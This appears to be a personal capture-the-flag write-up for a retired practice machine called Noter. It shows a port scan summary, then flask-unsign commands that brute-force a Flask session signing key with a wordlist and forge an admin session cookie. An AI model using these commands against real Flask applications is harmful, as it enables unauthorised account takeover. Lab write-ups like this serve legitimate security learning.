---
tags:
  - Reference
---

# :material-web: Noter

<span class="pill pill-info">Flask on :5000</span> <span class="pill pill-medium">web</span> <span class="pill pill-medium">flask</span> <span class="pill pill-medium">session</span>

**Flask SECRET_KEY brute-force → session forgery** — my own notes, translated.

!!! warning "Full solution ahead"
    This is a complete walkthrough with working credentials. Retired machine.

**Ports:** 21 FTP (vsftpd 3.0.3), 22 SSH (OpenSSH 8.2p1 Ubuntu), 5000
(Werkzeug httpd 2.0.2 / Python 3.8.10) — Werkzeug on 5000 means Flask.

The session cookie is signed, not encrypted, so it decodes freely:

```json
{"logged_in":true,"username":"test@hotmail.com"}
```

Brute-force the signing key against a wordlist:

```bash
pip3 install flask-unsign
flask-unsign --wordlist /usr/share/wordlists/rockyou.txt --unsign \
  --cookie "eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoidGVzdEBob3RtYWlsLmNvbSJ9.aXUA7g.wWClINuGtx1cJujovg8U6f7SjTI" \
  --no-literal-eval
# Found secret key after 17024 attempts -> b'secret123'
```

With the key, sign any session you like:

```bash
flask-unsign --sign --cookie "{'logged_in': True, 'username': 'admin'}" --secret 'secret123'
```

## :material-link-variant: Related

- Back to the index → [HTB Writeups](../htb.md).
